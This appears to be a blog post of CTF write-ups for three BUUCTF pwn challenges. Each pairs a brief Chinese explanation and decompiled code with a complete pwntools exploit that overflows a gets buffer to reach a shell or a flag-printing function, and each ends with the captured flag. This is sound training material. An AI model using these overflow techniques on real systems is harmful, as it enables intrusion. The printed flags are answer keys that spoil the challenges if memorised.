---
title: "Write-ups: BUUCTF"
published: 2025-07-05
updated: 2025-07-05
description: "Write-ups for BUUCTF's pwn aspect."
image: "./covers/buuctf.png"
tags: ["Pwn", "Write-ups"]
category: "Write-ups"
draft: false
---

# rip

## Information

- Category: Pwn
- Points: 1

## Write-up

丢给 IDA 老婆分析，看到有一个危险函数 `gets`，还有一个 `fun` 会返回 `system("/bin/sh")`，保护全关。直接打，注意栈对齐。

## Exploit

```python
#!/usr/bin/python

from pwn import ROP, args, context, flat, gdb, process, remote

gdbscript = """
b *main+32
b *main+67
c
"""

FILE = "./pwn1"
HOST, PORT = "node5.buuoj.cn", 27889

context(log_level="debug", binary=FILE, terminal="kitty")


def launch():
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)

    if args.D:
        gdb.attach(target, gdbscript=gdbscript)

    return target


def construct_payload():
    elf = context.binary
    rop = ROP(elf)

    payload = flat(b"A" * 0x17, rop.ret.address, elf.symbols["fun"])

    return payload


def main():
    target = launch()
    payload = construct_payload()

    target.sendline(payload)
    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

Flag: `flag{840e6d55-5582-4995-a345-79f37e63db00}`

# warmup_csaw_2016

## Information

- Category: Pwn
- Points: 1

## Write-up

`int sprintf(char* buffer, const char* format, ...);` 函数将格式化后的数据写入缓冲区，返回值是写入的字符数，不包括末尾的空字符 `\0`。`snprintf` 加入了缓冲区大小检查以及自动截断，比 `sprintf` 更安全，虽然本题没考这个函数的安全性问题。

这里 `vuln` 的地址将被写入 buffer `s`，然后 `write` 负责将 buffer `s` 中前九个字节，也就是 `vuln` 的地址输出到标准输出。

`main` 返回的是 `gets`，我们通过这个 `gets` 覆盖返回地址，修改为白送的 `vuln` 的地址即可。

```c del={11}
__int64 __fastcall main(int a1, char **a2, char **a3)
{
  char s[64]; // [rsp+0h] [rbp-80h] BYREF
  _BYTE v5[64]; // [rsp+40h] [rbp-40h] BYREF

  write(1, "-Warm Up-\n", 0xAuLL);
  write(1, "WOW:", 4uLL);
  sprintf(s, "%p\n", vuln);
  write(1, s, 9uLL);
  write(1, ">", 1uLL);
  return gets(v5);
}
```

```c
int vuln()
{
  return system("cat flag.txt");
}
```

## Exploit

```python
#!/usr/bin/python

from pwn import args, context, flat, gdb, process, remote

gdbscript = """
b *main+70
b *main+129
c
"""

FILE = "./pwn-patched"
HOST, PORT = "node5.buuoj.cn", 26553

context(log_level="debug", binary=FILE, terminal="kitty")


def launch():
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)

    if args.D:
        gdb.attach(target, gdbscript=gdbscript)

    return target


def construct_payload(leaked_addr):
    payload = flat(b"A" * 0x48, leaked_addr)

    return payload


def main():
    target = launch()

    target.recvuntil(b"WOW:")
    leaked_addr = int(target.recvline().strip(), 16)

    payload = construct_payload(leaked_addr)

    target.sendline(payload)
    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

Flag: `flag{25bcbfc0-3b7e-4261-b957-297bf39c1bfd}`

# ciscn_2019_n_1

## Information

- Category: Pwn
- Points: 1

## Write-up

通过 `gets` 将 `v2` 篡改为 `11.28125` 即可。

```c ins={9-10} del={8}
int func()
{
  _BYTE v1[44]; // [rsp+0h] [rbp-30h] BYREF
  float v2; // [rsp+2Ch] [rbp-4h]

  v2 = 0.0;
  puts("Let's guess the number.");
  gets(v1);
  if ( v2 == 11.28125 )
    return system("cat /flag");
  else
    return puts("Its value should be 11.28125");
}
```

第一次接触小数的处理问题，调试的时候，可以使用 `p/f $xmm0` 来查看这个寄存器的值，同理，使用 `p` 指令加上强制转换和解引用，可以检查地址处保存的小数值：

```asm wrap=false showLineNumbers=false
pwndbg> p/f $xmm0
$1 = {
  v8_bfloat16 = {-0, 11.25, 0, 0, 0, 0, 0, 0},
  v8_half = {-0, 2.6016, 0, 0, 0, 0, 0, 0},
  v4_float = {11.28125, 0, 0, 0},
  v2_double = {5.404878958234834e-315, 0},
  v16_int8 = {0, -128, 52, 65, 0 <repeats 12 times>},
  v8_int16 = {-0, 2.6016, 0, 0, 0, 0, 0, 0},
  v4_int32 = {11.28125, 0, 0, 0},
  v2_int64 = {5.404878958234834e-315, 0},
  uint128 = 3.98770131343430171379e-4942
}
pwndbg> p/f $xmm0.v4_int32[0]
$2 = 11.28125
pwndbg> p *(float *)($rbp - 4)
$3 = 11.28125
```

## Exploit

```python
#!/usr/bin/python

from pwn import args, context, flat, gdb, process, remote, struct

gdbscript = """
b *func+58
c
"""

FILE = "./ciscn_2019_n_1"
HOST, PORT = "node5.buuoj.cn", 25637

context(log_level="debug", binary=FILE, terminal="kitty")


def launch():
    if args.L:
        target = process(FILE)
    else:
        target = remote(HOST, PORT)

    if args.D:
        gdb.attach(target, gdbscript=gdbscript)

    return target


def construct_payload():
    payload = flat(b"A" * 0x2C, struct.pack("<f", 11.28125))

    return payload


def main():
    target = launch()

    payload = construct_payload()

    target.sendline(payload)
    target.interactive()


if __name__ == "__main__":
    main()
```

## Flag

Flag: `flag{7fd050d8-bfa7-44bc-b98b-a4ee709fea28}`
